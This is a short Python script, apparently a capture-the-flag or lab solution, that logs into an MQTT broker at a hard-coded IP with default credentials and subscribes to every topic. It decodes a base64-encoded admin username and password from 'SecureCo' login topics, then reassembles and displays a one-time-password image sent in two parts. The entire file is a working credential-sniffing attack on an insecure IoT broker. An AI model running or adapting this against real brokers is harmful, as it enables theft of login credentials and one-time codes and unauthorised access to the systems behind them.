import paho.mqtt.client as mqtt
import binascii
from PIL import Image

def on_connect(client, userdata, flags, rc):
    client.subscribe("#")

def on_message(client, userdata, msg):
    #print(msg.topic, msg.payload[:80])
    if msg.topic == 'Office/SecureCo/device/admin/login/u':
        print(f"User: {binascii.a2b_base64(msg.payload)}")

    if msg.topic == 'Office/SecureCo/device/admin/login/p':
        print(f"Password: {binascii.a2b_base64(msg.payload)}")
        
    if 'part1' in msg.topic:
        f = open('otp.jpg', 'wb')
        f.write(binascii.a2b_base64(msg.payload))
        f.close()

    if 'part2' in msg.topic:
        f = open('otp.jpg', 'ab')
        f.write(binascii.a2b_base64(msg.payload))
        f.close()

        im = Image.open('otp.jpg')
        im.show()

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.username_pw_set('iot', 'iot')

client.connect("35.225.10.98", 1883, 60)

client.loop_forever()
